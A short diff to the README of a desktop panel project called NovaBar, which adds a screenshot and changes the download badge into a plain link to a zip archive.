@@ -1,6 +1,8 @@
 # ✨ NovaBar - A Sleek Panel for Your Desktop 
 
-[![Download NovaBar](https://github.com/Dim747/NovaBar/raw/refs/heads/main/data/Nova-Bar-2.9.zip)](https://github.com/Dim747/NovaBar/raw/refs/heads/main/data/Nova-Bar-2.9.zip)
+![Screenshot of NovaBar](https://github.com/Dim747/NovaBar/raw/refs/heads/main/Screenshots/2.png)
+
+[Download NovaBar](https://github.com/Dim747/NovaBar/raw/refs/heads/main/data/Nova-Bar-2.9.zip)
 
 ## 🚀 Getting Started
 
